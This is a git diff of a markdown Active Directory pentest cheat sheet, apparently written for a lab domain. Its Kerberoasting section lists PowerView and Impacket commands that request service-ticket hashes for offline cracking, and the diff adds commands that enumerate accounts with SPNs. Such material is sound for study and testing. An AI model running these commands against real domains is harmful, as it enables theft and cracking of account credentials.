@@ -634,7 +634,7 @@ Get-ADUser -LdapFilter "(&(objectclass=user)(objectcategory=user)(useraccountcon
 
 ## 6.2 Kerberoasting
 
-```
+```powershell
 
 # 1. powerview
 Invoke-Kerberoast -OutputFormat Hashcat | % {$_.hash} | Out-File -Encoding ascii hash.txt
@@ -649,6 +649,17 @@ GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/hodor:hod
 ### TIPS:
 * If nothing comes back → there are no enabled user accounts with SPNs → nothing to kerberoast.
 * Many modern environments register services under machine accounts, not user accounts.
+
+## Get all SPNs (users + computers)
+
+```powershell
+# Users with SPNs
+Get-NetUser -SPN | Select-Object SamAccountName, ServicePrincipalName
+
+# Computers with SPNs
+Get-NetComputer -SPN | Select-Object Name, ServicePrincipalName
+```
+
 
 
 ### Refrences
